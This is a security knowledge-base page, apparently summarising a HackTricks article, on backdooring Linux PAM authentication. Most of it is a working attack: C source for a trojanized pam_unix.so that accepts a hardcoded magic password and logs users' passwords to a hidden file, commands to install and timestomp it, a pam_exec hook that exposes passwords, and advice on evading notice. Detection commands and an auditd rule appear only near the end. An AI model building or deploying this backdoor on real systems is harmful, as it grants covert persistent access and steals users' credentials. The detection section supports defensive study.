# HackTricks: PAM — Pluggable Authentication Modules

Source: [hacktricks-pam.md](../../raw/hacktricks-pam.md)

## Key Takeaways

PAM is the Linux authentication stack. Every SSH/console login calls `pam_unix.so:pam_sm_authenticate()`. This makes PAM libraries a high-value persistence target: replacing or augmenting them with a trojanized version installs a magic-password bypass and credential harvester that survives reboots and package updates (unless the package manager catches it).

## Architecture

- Config: `/etc/pam.d/<service>` (Linux) or `/etc/pam.conf` (Solaris/UNIX)
- Management realms: **auth**, **account**, **password**, **session**
- Module controls: `required` (fail deferred), `requisite` (fail immediate), `sufficient` (success short-circuits), `optional`
- Shared stacks: `sshd → password-auth → system-auth` on some distros — one implant fans out across multiple services

## Backdoor: Trojanizing pam_unix.so

```c
// Magic password bypass + credential harvesting
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user, *pass;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    if(pass && strcmp(pass, "Sup3rS3cret!") == 0) return PAM_SUCCESS;

    int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
    dprintf(fd, "%s:%s\n", user, pass);
    close(fd);

    if(!orig) orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
    return orig(pamh, flags, argc, argv);
}
```

Deploy:

```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so
touch -r /bin/ls /lib/security/pam_unix.so   # timestomp
```

OpSec: atomic `mv`, identical symbol exports (`pam_sm_setcred` etc.), log path that blends with legitimate artifacts.

## Lighter Persistence: pam_exec

Append to `/etc/pam.d/sshd` without replacing `pam_unix.so`:

```
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```

`pam_exec` passes `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, `PAM_TYPE` as env vars; with `expose_authtok` the helper reads the password from stdin during `auth` phase.

## RHEL/Fedora: authselect Persistence

Direct edits to `/etc/pam.d/system-auth` may be overwritten by `authselect`. Patch the custom profile instead:

```bash
authselect current
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls
authselect select custom/<profile>
```

If a file contains `Generated by authselect`, the real persistence point is under `/etc/authselect/custom/`.

## Detection / Triage

```bash
# Alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f \
  -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep pam_

# Package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# Unpackaged modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f"; done

# Unexpected config entries
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|custom|exec'
```

auditd rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`

## In the Wild

The **Plague** backdoor (reported 2025) used the same core pattern: static bypass password in a malicious PAM component, plus `HISTFILE=/dev/null` to suppress session traces after login.
